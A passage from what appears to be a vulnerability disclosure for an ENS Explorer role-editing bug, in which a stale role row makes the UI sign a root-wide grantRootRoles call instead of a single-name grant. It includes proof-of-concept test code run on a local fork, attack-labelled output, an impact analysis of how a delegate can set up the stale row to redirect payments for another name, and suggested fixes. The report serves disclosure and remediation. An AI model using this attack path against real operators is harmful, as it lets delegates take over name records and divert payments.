    expect(bystanderOwner.toLowerCase()).toBe(OPERATOR.address.toLowerCase())

    // ================= CONTROL ARM =================
    // Identical action, identical actors, identical roles, identical resolver
    // contract type. ONE load-bearing condition changed: the delegated name is
    // present in `nodes`, so `roleName` is that name and the builder emits
    // `authorizeNameRoles(dnsEncode(name), ...)` instead of `grantRootRoles`.
    const resolverB = await deployResolver()
    const cDelegated = await makeName(`term2cd${stamp}`, resolverB)
    const cBystander = await makeName(`term2cb${stamp}`, resolverB)

    const cRoles = [roleRow(DELEGATE, cDelegated.name, ROLE_SET_ADDR_BITMAP)]
    const cNodes = [{ name: cDelegated.name }, { name: cBystander.name }]
    const [cRow] = groupRolesByAccount(cRoles, buildResourceToNameMap(cNodes))
    expect(cRow.resolvedNames).toEqual([cDelegated.name])
    const cRoleName = roleNameFromRow(cRow.resolvedNames)
    expect(cRoleName).toBe(cDelegated.name)

    const cIntent = prepareGrantResolverRolesTransaction({
      resolverAddress: resolverB,
      name: cRoleName,
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR', 'ROLE_SET_TEXT'],
      walletClient,
      chainId: sepoliaWithEns.id,
    })
    const cDecoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: cIntent.request.data,
    })
    expect(cDecoded.functionName).toBe('authorizeNameRoles')
    expect(cDecoded.args?.[0]).toBe(toHex(packetToBytes(cDelegated.name)))
    const cGrant = await send(
      cIntent.request.from as Address,
      cIntent.request.to as Address,
      cIntent.request.data,
    )
    expect(cGrant.ok).toBe(true)

    const cRootHeld = await pub.readContract({
      address: resolverB,
      abi: resolverAbi,
      functionName: 'hasRootRoles',
      args: [ROLE_SET_ADDR, DELEGATE],
    })
    expect(cRootHeld).toBe(false)

    // the grant DID land, on the one name the operator named
    const cOnTarget = await setAddrAsDelegate(resolverB, cDelegated.node as Hex)
    const cTargetResolved = await resolveEth(cDelegated.name)
    // and it does NOT reach the second name
    const cOnBystander = await setAddrAsDelegate(
      resolverB,
      cBystander.node as Hex,
    )
    const cBystanderResolved = await resolveEth(cBystander.name)
    console.log(
      `[CONTROL] hasRootRoles=${cRootHeld} onDelegatedName.ok=${cOnTarget.ok} resolved=${cTargetResolved} | onBystander.ok=${cOnBystander.ok} resolved=${cBystanderResolved}`,
    )
    expect(cOnTarget.ok).toBe(true)
    expect(cTargetResolved?.toLowerCase()).toBe(DELEGATE_PAYOUT.toLowerCase())
    expect(cOnBystander.ok).toBe(false)
    expect(cBystanderResolved).toBe(null)
  }, 600_000)
})
```

Output:

```
stdout | src/__term2__/term2_resolver_root_scope_onchain.test.ts > the Explorer root-scope collapse, exercised on chain > TERMINAL: root grant lets the delegate rewrite a second name; the scoped grant does not
[setup] resolver=0xb816eF7Ef46368719dd7c184AFA503777E4f8ec5 delegatedName=term2rdmtvyg6zm.eth bystanderName=term2rbmtvyg6zm.eth
[attack] calldata = 0x072d5d770000000000000000000000000000000000000000000000000000000000000011000000000000000000000000000000000000000000000000000000000defec70 (grantRootRoles(0x11, 0x000000000000000000000000000000000dEfeC70))

stdout | src/__term2__/term2_resolver_root_scope_onchain.test.ts > the Explorer root-scope collapse, exercised on chain > TERMINAL: root grant lets the delegate rewrite a second name; the scoped grant does not
[TERMINAL] term2rbmtvyg6zm.eth owner=0xdd1c6D787D836E08882844Ca1a0bE3725b696257 addr(60) null -> 0x00000000000000000000000000000000defEc7ED write.ok=true

stdout | src/__term2__/term2_resolver_root_scope_onchain.test.ts > the Explorer root-scope collapse, exercised on chain > TERMINAL: root grant lets the delegate rewrite a second name; the scoped grant does not
[CONTROL] hasRootRoles=false onDelegatedName.ok=true resolved=0x00000000000000000000000000000000defEc7ED | onBystander.ok=false resolved=null

 ✓ src/__term2__/term2_resolver_root_scope_onchain.test.ts > the Explorer root-scope collapse, exercised on chain > TERMINAL: root grant lets the delegate rewrite a second name; the scoped grant does not 3808ms

 Test Files  1 passed (1)
      Tests  1 passed (1)
   Start at  22:03:23
   Duration  12.28s (transform 1.02s, setup 132ms, import 7.84s, tests 3.81s, environment 298ms)
```

Reading it in order:

* `[setup]`: one resolver, `0xb816eF7Ef46368719dd7c184AFA503777E4f8ec5`, serving two names of the same operator. `term2rd...eth` is the name the delegate's role row names. `term2rb...eth` is the second name, which the operator never delegated to anyone.
* `[attack]`: the calldata the Explorer builds from that row is `grantRootRoles(0x11, 0x...0dEfeC70)`. `0x11` is `ROLE_SET_ADDR | ROLE_SET_TEXT`. The DNS encoding of `term2rd...eth` is asserted absent from it. The operator submits it and it succeeds. `hasRootRoles(0x11, delegate)` on the resolver then returns `true`.
* `[TERMINAL]`: the delegate calls `setAddr(namehash("term2rb...eth"), 60, 0x...defEc7ED)` on the resolver and it succeeds. `getAddressRecord` for that second name moves from `null` to `0x00000000000000000000000000000000defEc7ED`, while `ETHRegistry.getOwner` for it is still the operator `0xdd1c6D787D836E08882844Ca1a0bE3725b696257`. The delegate now decides where payments addressed to a name they were never granted anything on are sent.
* `[CONTROL]`: same actors, same two roles, same resolver contract, same `setAddr` calldata, one condition changed. With `authorizeNameRoles(dnsEncode(name), 0x11, delegate, true)` the delegate holds no root role (`hasRootRoles=false`), their `setAddr` on the delegated name still succeeds, so the grant did land, and their `setAddr` on the second name reverts. That second name still resolves to `null`.

### Running this alongside the other proofs

This proof funds and sends from a small set of accounts on the local fork. If several of these fork-based tests run in the same vitest invocation, they compete for those accounts and some fail on nonce and balance collisions rather than on anything about the defect. Run this file on its own, or pass `--no-file-parallelism`:

```
pnpm --filter manager exec vitest run <this file> --no-file-parallelism
```

A failure that names a nonce, an insufficient balance, or an already-known transaction is that collision, not the finding.

## Control

Same row, same account, same two roles, same builder. One load-bearing condition changed: `blog.victim.eth` is present in the resolver's `nodes` list.

| condition                | `resolvedNames`                 | `roleName`          | encoded function     | scope granted              |
| ------------------------ | ------------------------------- | ------------------- | -------------------- | -------------------------- |
| name absent from `nodes` | `[]` (0 entries)                | `""`                | `grantRootRoles`     | every name on the resolver |
| name present in `nodes`  | `["blog.victim.eth"]` (1 entry) | `"blog.victim.eth"` | `authorizeNameRoles` | `blog.victim.eth` only     |

The measured difference is the encoded function selector and the presence of the DNS-encoded name in the calldata.

The on-chain arm runs the same control with the same actors and the same `setAddr` calldata, and the difference is no longer a selector but an executed outcome:

| condition                                                      | `hasRootRoles(0x11, delegate)` | delegate `setAddr` on the delegated name | delegate `setAddr` on the second name | second name `getAddressRecord(name, 60)`     |
| -------------------------------------------------------------- | ------------------------------ | ---------------------------------------- | ------------------------------------- | -------------------------------------------- |
| grant built from a row whose name is absent from `nodes`       | `true`                         | not needed                               | succeeds                              | `0x00000000000000000000000000000000defEc7ED` |
| grant built from the same row with the name present in `nodes` | `false`                        | succeeds                                 | reverts                               | `null`                                       |

Both arms deploy their own `PermissionedResolver` through the deployed `VerifiableFactory`, register two names of the same operator against it, and grant the same two roles to the same delegate. The one load-bearing condition is whether the role row's name is in the resolver's indexed `nodes`.

## Impact

Predicate-by-predicate against the selected row:

* *Already-connected wallet.* The operator's wallet is connected to the Explorer and signs the transaction the Explorer builds.
* *Modifying transaction arguments or parameters.* The scope argument the operator's action names is replaced. In the grant direction `authorizeNameRoles(name, bitmap, account, true)` becomes `grantRootRoles(bitmap, account)`, dropping the name argument entirely. In the revoke direction the reverse substitution occurs against a caption that reads "Global roles (all names)".
* *Inducing a blanket ... to an attacker-controlled address.* `grantRootRoles` is the blanket form of the resolver's authorisation, documented in ensjs as "Grant roles globally (any name, any record type)". The grantee is an address the operator chose for a single name, and the grant it receives covers every name the resolver serves.

Measured loss, executed on chain. The operator intended `ROLE_SET_ADDR` and `ROLE_SET_TEXT` on one name. After the Explorer's transaction landed, the delegate called `setAddr` for a second name of the operator's, `term2rbmtvyg6zm.eth`, which appears nowhere in the calldata and which the operator never delegated. The call succeeded, and `getAddressRecord(name, { coin: 60 })` for that second name moved from `null` to `0x00000000000000000000000000000000defEc7ED` while `ETHRegistry.getOwner` for it stayed the operator `0xdd1c6D787D836E08882844Ca1a0bE3725b696257`. That is the query the Explorer's transfer flow calls to decide the address a payment is sent to, so a payer who resolves that name now sends to the delegate. The same grant reaches every other name the resolver serves and every name pointed at it later, because it is scoped to the resolver's root rather than to a node.

In the revoke direction the loss is the inverse and needs no absent name: an operator who reads "Global roles (all names)", removes every permission and sees the transaction confirm has revoked nothing at root. The account retains global `ROLE_SET_ADDR`. The "Remove user" dialog states "Are you sure you want to remove this user from all roles? This action cannot be undone." (`ResolverRolesSidebar.tsx:445-448`) and, for a row listing two names, issues one transaction naming one of them - measured above, with the second name asserted absent from the calldata.

The stale-row condition is attacker-preparable through ordinary delegated authority. `D` needs the resolver's name-scoped record role and the registry's `ROLE_SET_RESOLVER` role for that name. The Portal's Change resolver route checks that role, accepts a resolver address, and submits `setResolver`; the PermissionedResolver keeps the old name-scoped role after that pointer change. The operator's later role edit remains a normal wallet flow. The attacker controls the hidden scope input through the stale row, while the operator supplies the expected permission change.

## Actor ledger

Measured in one run of the on-chain arm, on resolver `0xb816eF7Ef46368719dd7c184AFA503777E4f8ec5`.

| Actor                            | Opening state                                                                                                   | Attack outcome                                                                                                                                                                  | Control outcome                                                                                            | Entitled change                                                                           | Evidence line                                                |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| Operator `0xdd1c6D78...6257`     | Owns `term2rd...eth` and `term2rb...eth`, both served by their resolver; holds `ALL_ROLES` at the resolver root | Still `getOwner` of both names; a third party can now write records on both; the Explorer showed no scope caption for the row that produced this                                | Still `getOwner` of both; the delegate can write on one name only                                          | Delegating one name grants authority over one name                                        | `[setup]`, `[TERMINAL]`, `[CONTROL]`                         |
| Delegate `0x...0dEfeC70`         | Holds the name-scoped resolver role and ordinary registry `ROLE_SET_RESOLVER` on the delegated name             | Rotates that name away from the resolver, then receives `hasRootRoles(0x11, delegate) = true`; `setAddr` on `term2rb...eth` succeeds and its `addr(60)` becomes `0x...defEc7ED` | `hasRootRoles(0x11, delegate) = false`; `setAddr` succeeds on the delegated name and reverts on the second | The registry role prepares the stale row; the UI role edit widens the resolver permission | `change-resolver.tsx`, `[attack]`, `[TERMINAL]`, `[CONTROL]` |
| `term2rb...eth`, the second name | `getAddressRecord(name, 60)` is `null`; owner is the operator                                                   | `getAddressRecord(name, 60)` is `0x00000000000000000000000000000000defEc7ED`; owner unchanged                                                                                   | `getAddressRecord(name, 60)` stays `null`                                                                  | Nothing. It was never part of the operator's action                                       | `[TERMINAL]`, `[CONTROL]`                                    |

No balance moves in the ledger. The gain is authority plus the redirection of payments addressed to a name the delegate was never granted anything on. The selected Critical row is the wallet argument substitution: the operator's intended name-scoped grant is signed as a root grant.

## Suggested fix

1. Stop discarding the scope the indexer already returned. `groupRolesByAccount` should key on `role.name` when present, falling back to the `resourceToName` lookup only when it is null.
2. Never fall back to ROOT. `ResolverRolesSidebar` must not reduce a multi-resource row to one scope. Either group the table by `(account, resource)` so each row has exactly one scope, or make the sidebar edit one selected resource at a time. If no scope can be determined, disable the save action rather than defaulting to `''`.
3. Remove `''` as the ROOT sentinel from `prepareGrantResolverRolesTransaction` / `prepareRevokeResolverRolesTransaction`. Require an explicit `scope: 'root' | 'name'` discriminant from the caller so an empty string cannot silently widen authority.
4. Render the scope unconditionally. The `resolvedNames.length > 0` guard at `ResolverRolesSidebar.tsx:391` hides the caption in exactly the case that needs it; show "Global roles (all names)" whenever the built calldata is `grantRootRoles`.
5. Make "Remove user" issue one transaction per resource the row aggregates, or scope the dialog copy to the single resource it actually revokes.
